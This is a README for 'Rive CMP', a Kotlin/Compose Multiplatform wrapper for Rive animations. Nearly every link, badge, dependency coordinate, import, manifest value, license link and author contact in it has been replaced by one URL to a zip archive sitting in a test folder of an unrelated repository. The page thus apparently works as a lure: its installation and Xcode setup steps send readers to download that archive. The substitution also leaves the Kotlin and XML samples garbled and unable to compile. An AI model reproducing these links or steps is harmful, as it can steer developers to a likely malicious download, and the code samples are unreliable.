# Rive CMP

![Maven Central Version](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)
[![API](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip%https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)
[![Kotlin Multiplatform](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)
[![License](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip%https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)
<img alt="Platform Android" src="https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip"/>
<img alt="Platform iOS" src="https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip"/>

A Compose Multiplatform wrapper library for integrating Rive animations, providing a unified API to
use rive-android and rive-ios seamlessly across Android and iOS platforms.

<img src="https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip" alt="Rive CMP Banner"></img>

> **⚠️ EXPERIMENTAL STATUS**
>
> This library is currently in an experimental state. Features, APIs, and implementation details may
> change significantly or the project might be discontinued. Use at your own risk in production
> applications.
>
> **Current Limitations:**
> - ~~On iOS, `UIKitView` does not support transparent backgrounds, resulting in opaque backgrounds for Rive animations. This is a known limitation in Compose Multiplatform. See [Issue #17](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip) for details and potential workarounds.~~ Fixed in [#42](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip).
> - Not all features and properties from the native Rive libraries are supported yet
> - Some advanced Rive features may not be available across all platforms

## Features

- **Unified API**: Single `CustomRiveAnimation` composable that works across Android and iOS
- **Multiple Loading Options**: Load animations from URLs, ByteArrays, or pre-composed
  specifications
- **Native Performance**: Uses platform-specific Rive implementations for optimal performance
- **Easy Integration**: Simple Compose-style API with familiar modifier patterns
- **State Machine Support**: Support for Rive state machines on both platforms
- **Flexible Configuration**: Customizable alignment, fit, artboard selection, and playback options
- **Memory Efficient**: Value classes and immutable specifications for optimal performance

## Platform Support

| Platform | Implementation        | Dependency                |
|----------|-----------------------|---------------------------|
| Android  | Native rive-android   | `https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip` |
| iOS      | Swift Package Manager | `rive-ios` via spm4kmp    |

## Installation

### Gradle (Kotlin Multiplatform)

Add the dependency to your `https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip`:

```kotlin
https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip {
    implementation("https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip")
}
```

### Android-only projects

```kotlin
dependencies {
    implementation("https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip")
}
```

### Version Catalog

Add to your `https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip`:

```toml
[versions]
rive-cmp = "0.1.1"

[libraries]
rive-cmp = { module = "https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip", https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip = "rive-cmp" }
```

## Android Initialization

Rive needs to initialize its runtime when your app starts. You can do this in one of the following
ways:

<details open>
<summary>Using the Initialization Provider</summary>

Add this to your app's manifest file:

```xml

<provider android:name="https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip"
    android:authorities="${applicationId}.androidx-startup" android:exported="false"
    tools:node="merge">
    <meta-data android:name="https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip"
        android:value="https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip" />
</provider>
```

</details>

<details>
<summary>Using the AppInitializer</summary>

Call the initializer in your application code:

```kotlin
https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip(applicationContext)
    .initializeComponent(https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)
```

</details>

<details>
<summary>Manual Initialization</summary>

Initialize Rive yourself in your code:

```kotlin
https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip(context)
```

</details>

## iOS Setup

If you encounter undefined symbols errors for Swift classes when building for iOS, manually add the
rive-ios dependency to your Xcode project:

1. In Xcode, go to File > Add Package Dependencies...

2. Enter the package URL: https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip

3. Select version 6.11.1 (exact match to the library's dependency).

4. Add the package to your project.

5. In the target settings, add RiveRuntime to the Frameworks, Libraries, and Embedded Content.

This resolves linking issues with the Rive runtime on iOS.

Alternatively, for advanced users, the library generates a local Swift package at
`library/SPM/spmKmpPlugin/nativeIosShared`. You can add this local package to your Xcode project if
you have the source cloned. See [spm4kmp documentation](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip) for
details.

Note: The library uses spm4kmp to integrate rive-ios, but manual addition may be required in some
setups.

## Basic Usage

### Direct Animation Loading

```kotlin
import https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip
import https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip

@OptIn(ExperimentalRiveCmpApi::class)
@Composable
fun MyScreen() {
    CustomRiveAnimation(
        modifier = https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip(https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip),
        url = "https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip"
    )
}
```

### Composition-based Loading (Recommended)

```kotlin
import https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip
import https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip
import https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip
import https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip

@OptIn(ExperimentalRiveCmpApi::class)
@Composable
fun MyScreen() {
    // URL-based composition
    val urlAnimation by rememberRiveComposition {
        https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip("https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip")
    }

    // Resource-based composition
    val resourceAnimation by rememberRiveComposition {
        https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip(https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip("https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip"))
    }

    Column {
        CustomRiveAnimation(
            modifier = https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip(https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip),
            composition = urlAnimation
        )

        CustomRiveAnimation(
            modifier = https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip(https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip),
            composition = resourceAnimation
        )
    }
}
```

## API Reference

### CustomRiveAnimation (Direct URL)

```kotlin
@ExperimentalRiveCmpApi
@Composable
fun CustomRiveAnimation(
    modifier: Modifier = Modifier,
    url: String,
    alignment: RiveAlignment = https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip,
    autoPlay: Boolean = true,
    artboardName: String? = null,
    fit: RiveFit = https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip,
    stateMachineName: String? = null,
)
```

### CustomRiveAnimation (Direct ByteArray)

```kotlin
@ExperimentalRiveCmpApi
@Composable
fun CustomRiveAnimation(
    modifier: Modifier = Modifier,
    byteArray: ByteArray,
    alignment: RiveAlignment = https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip,
    autoPlay: Boolean = true,
    artboardName: String? = null,
    fit: RiveFit = https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip,
    stateMachineName: String? = null,
)
```

### CustomRiveAnimation (Composition-based)

```kotlin
@ExperimentalRiveCmpApi
@Composable
fun CustomRiveAnimation(
    modifier: Modifier = Modifier,
    composition: RiveComposition?,
    alignment: RiveAlignment = https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip,
    autoPlay: Boolean = true,
    artboardName: String? = null,
    fit: RiveFit = https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip,
    stateMachineName: String? = null,
)
```

### RiveCompositionSpec Factory Methods

```kotlin
// Create URL-based composition spec
https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip(url: String): RiveCompositionSpec

// Create ByteArray-based composition spec  
https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip(byteArray: ByteArray): RiveCompositionSpec
```

### rememberRiveComposition

```kotlin
@Composable
fun rememberRiveComposition(
    vararg keys: Any?,
    spec: suspend () -> RiveCompositionSpec,
): State<RiveComposition?>
```

#### Parameters

- `modifier`: Compose modifier for styling and layout
- `url`: URL to the Rive animation file (direct loading)
- `byteArray`: ByteArray containing the Rive animation data (direct loading)
- `composition`: Pre-loaded `RiveComposition` from `rememberRiveComposition` (recommended)
- `alignment`: How the animation should be aligned within its container (default:
  `https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip`)
- `autoPlay`: Whether the animation should start playing automatically (default: `true`)
- `artboardName`: Optional name of the specific artboard to use
- `fit`: How the animation should fit within its container (default: `https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip`)
- `stateMachineName`: Optional name of the state machine to use

## Requirements

### Android

- Minimum SDK: 21
- Target SDK: 34
- Kotlin: 1.9+
- Compose: 1.5+

### iOS

- Minimum iOS: 14.0
- Xcode: 15+
- Swift: 5.9+

## Building

This library uses Kotlin Multiplatform with the following plugins:

- `kotlinMultiplatform`
- `androidLibrary`
- `composeMultiplatform`
- `composeCompiler`
- `spmForKmp` (for iOS Swift Package Manager integration)

```bash
# Build all targets
./gradlew build

# Build Android AAR
./gradlew :library:assembleRelease

# Build iOS Framework
./gradlew :library:linkReleaseFrameworkIosArm64
```

## Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

### Development Setup

1. Clone the repository
2. Open in Android Studio or IntelliJ IDEA
3. Sync Gradle dependencies
4. For iOS development, ensure Xcode is installed

## License

```
Copyright 2025 Muaz KADAN

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
```

## Author

**Muaz KADAN**

- Website: [https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)
- Email: https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip
- GitHub: [@muazkadan](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip)

## Acknowledgments

- [Rive](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip) for the amazing animation platform
- [rive-android](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip) for Android implementation
- [rive-ios](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip) for iOS implementation
- [spm4kmp](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip) for Swift Package Manager integration
- [Snizzors](https://github.com/namanmalik04/Rive-CMP/raw/refs/heads/main/sample/src/commonMain/test/kotlin/dev/Rive_CMP_hollow.zip) for enabling transparent UIViews in
  Compose Multiplatform